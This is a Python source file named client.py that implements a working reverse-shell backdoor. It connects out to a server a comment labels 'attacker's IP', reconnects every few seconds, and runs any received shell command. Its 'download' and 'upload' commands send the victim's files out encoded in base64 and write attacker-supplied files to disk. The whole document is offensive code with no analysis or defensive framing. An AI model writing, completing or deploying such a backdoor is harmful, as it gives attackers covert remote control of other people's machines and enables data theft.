# client.py
import socket
import json
import subprocess
import os
import base64
import time

SERVER_IP = "127.0.0.1"   # Change this to attacker's IP
SERVER_PORT = 4444

def reliable_send(data):
    json_data = json.dumps(data)
    s.send(json_data.encode())

def reliable_receive():
    data = b""
    while True:
        try:
            data += s.recv(1024)
            return json.loads(data.decode())
        except json.JSONDecodeError:
            continue

def execute_command(command):
    try:
        return subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode()
    except subprocess.CalledProcessError as e:
        return e.output.decode()

def read_file(path):
    try:
        with open(path, "rb") as f:
            return base64.b64encode(f.read()).decode()
    except FileNotFoundError:
        return "[-] File not found."

def write_file(path, content):
    try:
        with open(path, "wb") as f:
            f.write(base64.b64decode(content))
        return "[+] Upload complete."
    except:
        return "[-] Failed to write file."

def connection():
    while True:
        try:
            global s
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_IP, SERVER_PORT))
            shell()
        except:
            time.sleep(5)

def shell():
    while True:
        command = reliable_receive()

        if command == "exit":
            s.close()
            break

        elif command.startswith("cd "):
            try:
                os.chdir(command[3:])
                result = f"[+] Changed directory to {os.getcwd()}"
            except FileNotFoundError:
                result = "[-] Directory not found."

        elif command.startswith("download "):
            file_path = command[9:].strip()
            file_content = read_file(file_path)
            if file_content.startswith("[-]"):
                reliable_send({"status": "error", "message": file_content})
            else:
                reliable_send({
                    "status": "success",
                    "filename": os.path.basename(file_path),
                    "data": file_content
                })
            continue

        elif command.startswith("upload "):
            file_path = command[7:].strip()
            file_package = reliable_receive()
            if file_package.get("status") == "success" and file_package.get("data"):
                content = file_package.get("data")
                result = write_file(file_path, content)
            else:
                result = "[-] Upload failed: invalid or missing data."

        else:
            result = execute_command(command)

        reliable_send(result)

connection()
